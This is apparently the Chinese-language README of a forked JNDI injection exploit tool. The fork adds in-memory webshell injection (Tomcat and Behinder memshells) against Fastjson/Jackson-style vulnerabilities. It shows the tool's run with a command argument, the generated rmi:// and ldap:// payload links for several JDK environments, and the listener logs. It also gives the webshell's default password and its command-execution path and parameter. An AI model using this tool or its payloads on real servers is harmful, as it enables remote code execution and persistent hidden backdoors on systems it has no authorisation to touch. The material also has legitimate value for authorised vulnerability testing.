## 介绍

JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。

原本想自己做一个RMI注入内存马的工具，参考了一下welk1n佬的项目，结果发现佬写的精妙，可以改动的地方很少了已经，索性直接fork大佬的项目，添加工具。
原仓库地址：https://github.com/welk1n/JNDI-Injection-Exploit

冰蝎内存🐴默认密码:rebeyond

## 更新功能

### 内存马注入

直接运行jar包，可以看到添加了Tomcat Memshell、Behinder两种内存马（还在更新中）

```shell
$ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar          
[ADDRESS] >> 127.0.0.1
[COMMAND] >> open /Applications/Calculator.app
----------------------------JNDI Links----------------------------
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://127.0.0.1:1099/qbf3r4
Target environment(Behinder Memshell):
rmi://127.0.0.1:1099/7oufct
ldap://127.0.0.1:1389/7oufct
Target environment(Tomcat Memshell):
rmi://127.0.0.1:1099/zskyrz
ldap://127.0.0.1:1389/zskyrz
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://127.0.0.1:1099/j5edul
ldap://127.0.0.1:1389/j5edul
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://127.0.0.1:1099/jkzrcz
ldap://127.0.0.1:1389/jkzrcz

----------------------------Server Log----------------------------
2023-08-25 10:07:14 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2023-08-25 10:07:14 [RMISERVER]  >> Listening on 0.0.0.0:1099
2023-08-25 10:07:14 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

- Tomcat Memshell
  - 命令执行内存马：路径/shell，参数cmd



## 待实现

- 融合groovy的bypass利用链到项目中。
- 更新weblogic以及其他中间件的内存马注入环境
